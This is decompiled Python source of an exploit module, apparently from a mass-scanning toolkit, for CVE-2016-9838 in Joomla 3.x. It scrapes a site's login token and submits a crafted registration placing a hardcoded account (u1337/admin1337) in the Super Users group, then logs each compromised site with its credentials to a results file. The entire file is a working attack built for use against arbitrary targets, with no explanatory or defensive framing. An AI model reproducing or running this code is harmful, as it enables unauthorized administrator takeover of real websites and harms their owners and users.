# uncompyle6 version 2.11.5
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.18 (default, Apr 20 2020, 20:30:41) 
# [GCC 9.3.0]
# Embedded file name: Exploits\CVE_2016_9838TakeAdminJoomla.py
import requests
import re
from Exploits import printModule
r = '\x1b[31m'
g = '\x1b[32m'
y = '\x1b[33m'
b = '\x1b[34m'
m = '\x1b[35m'
c = '\x1b[36m'
w = '\x1b[37m'
agent = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}

def Exploit(site, email):
    sess = requests.Session()
    username = 'u1337'
    password = 'admin1337'
    try:
        resp = sess.get('http://' + site + '/index.php/component/users/?view=login', headers=agent, timeout=10)
        token = re.findall('<input type="hidden" name="(.*)" value="1"', str(resp.content))[0]
    except:
        return printModule.returnNo(site, 'CVE-2016-9838', 'Joomla! 3.x Add Admin', 'Joomla')

    try:
        Headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0',
           'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
           'Accept-Language': 'en-US,en;q=0.5',
           'Connection': 'keep-alive',
           'Referer': 'http://{}/index.php/component/users/?view=registration'.format(site),
           'Upgrade-Insecure-Requests': '1'
           }
        data = {'user[name]': username,
           'user[username]': username,
           'user[password1]': password,
           'user[password2]': password,
           'user[email1]': email,
           'user[email2]': email,
           'user[groups][]': '7',
           'user[activation]': '0',
           'user[block]': '0',
           'form[name]': username,
           'form[username]': username,
           'form[password1]': password,
           'form[password2]': password,
           'form[email1]': email,
           'form[email2]': email,
           'form[option]': 'com_users',
           'form[task]': 'user.register',
           token: '1'
           }
        Req = sess.post('http://' + site + '/index.php/component/users/?task=user.register', data=data, timeout=10, headers=Headers)
        if 'id="system-message"' in str(Req.content):
            with open('result/AdminTakeover_results.txt', 'a') as writer:
                writer.write(site + '/administrator/index.php --> Active Link Sended to: {}\n  Username: {}\n  Password: {}\n------------------------------------------\n'.format(email, username, password))
            return printModule.returnYes(site, 'CVE-2016-9838', 'Joomla! 3.x Add Admin', 'Joomla')
        return printModule.returnNo(site, 'CVE-2016-9838', 'Joomla! 3.x Add Admin', 'Joomla')
    except:
        return printModule.returnNo(site, 'CVE-2016-9838', 'Joomla! 3.x Add Admin', 'Joomla')